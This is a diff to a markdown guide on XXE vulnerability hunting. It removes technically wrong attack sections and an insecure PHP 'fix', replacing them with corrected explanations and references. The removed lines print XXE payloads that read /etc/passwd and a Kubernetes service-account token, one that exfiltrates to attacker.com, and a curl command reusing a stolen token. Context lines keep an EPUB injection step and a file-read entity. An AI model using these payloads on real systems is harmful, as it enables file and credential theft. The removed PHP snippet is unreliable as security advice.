@@ -302,20 +302,9 @@ EPUB files are ZIP archives containing XML. Target library management systems an
 3. Inject XXE into `META-INF/container.xml` or `content.opf`
 4. Re-zip and upload to target (library systems, e-commerce platforms)
 
-#### Apple Universal Links XXE
+#### Apple Universal Links / AASA
 
-iOS deep linking configuration files:
-
-```xml
-<!-- apple-app-site-association generated from XML -->
-<?xml version="1.0"?>
-<!DOCTYPE config [
-  <!ENTITY xxe SYSTEM "file:///var/mobile/Containers/Data/Application/config.plist">
-]>
-<config>
-  <applinks>&xxe;</applinks>
-</config>
-```
+The `apple-app-site-association` file is JSON, not XML, so it is not an XXE input by itself. Do not treat this format as an XXE vector. Assess a separate component only if evidence shows that it actually parses attacker-controlled XML with an unsafe parser configuration.
 
 ### Advanced XXE Hunting
 
@@ -369,40 +358,7 @@ Content-Type: text/xml
 
 ### Cloud-Native & Kubernetes XXE
 
-#### Kubernetes Admission Webhook XXE
-
-ValidatingWebhookConfiguration and MutatingWebhookConfiguration receive XML-formatted requests:
-
-```yaml
-# Vulnerable admission webhook
-apiVersion: v1
-kind: Pod
-metadata:
-  name: evil-pod
-  annotations:
-    # Webhook receives and parses this XML
-    config: |
-      <?xml version="1.0"?>
-      <!DOCTYPE root [
-        <!ENTITY xxe SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">
-      ]>
-      <config>&xxe;</config>
-```
-
-**Exploitation flow:**
-
-```bash
-# 1. Create pod with XXE payload in annotation
-kubectl apply -f evil-pod.yaml
-
-# 2. Admission webhook receives XML, processes with vulnerable parser
-# 3. Service account token exfiltrated
-
-# 4. Use token for privilege escalation
-curl -k https://kubernetes.default.svc/api/v1/namespaces/default/pods \
-  -H "Authorization: Bearer $(cat token)"
-```
-
+Kubernetes admission requests are normally JSON or protobuf, not XML. An annotation containing XML text is not parsed as XML unless a particular custom webhook explicitly parses it. Do not infer XXE, token exposure, or privilege escalation from an admission manifest alone. For an authorized review, verify the webhook implementation and parser configuration using a harmless, non-networked test case; do not submit payloads to a production cluster.
 **ConfigMap XXE:**
 
 ```yaml
@@ -596,16 +552,9 @@ sequenceDiagram
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:%2F%2F%2Fetc%2Fpasswd"> ]>
   ```
 
-### XXE in CDATA Sections
+### XML Embedded in CDATA
 
-```xml
-<![CDATA[<!DOCTYPE data [
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
-%eval;
-%exfil;
-]>]]>
-```
+CDATA content is character data, not parsed markup; a `DOCTYPE` or entity declaration inside CDATA does not trigger XXE in the enclosing XML document. Treat it as inert text unless the application later extracts and reparses that text as XML, which must be established from the actual processing path.
 
 ### XXE via XML Namespace
 
@@ -985,10 +934,9 @@ using var reader = XmlReader.Create(stream, settings);
 type Safe struct{ }
 ```
 
-```php
-// PHP – libxml
-$old = libxml_disable_entity_loader(true);
-$xml = simplexml_load_string($data, "SimpleXMLElement", LIBXML_NONET | LIBXML_NOENT);
-libxml_disable_entity_loader($old);
-```
+### PHP / libxml
+
+Do not pass `LIBXML_NOENT` for untrusted XML: despite its name, it substitutes entities and can enable XXE. `LIBXML_NONET` blocks network access but does not by itself disable local-file entity resolution. Prefer disabling DTD and external-entity processing; follow current PHP/libxml guidance for deployed versions. Do not use `libxml_disable_entity_loader()` as a portable fix; its behavior and status vary by PHP/libxml version.
+
+References: [Apple associated domains](https://developer.apple.com/documentation/xcode/supporting-associated-domains), [PHP libxml constants](https://www.php.net/manual/en/libxml.constants.php), [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html), [W3C XML 1.0](https://www.w3.org/TR/xml/).
 
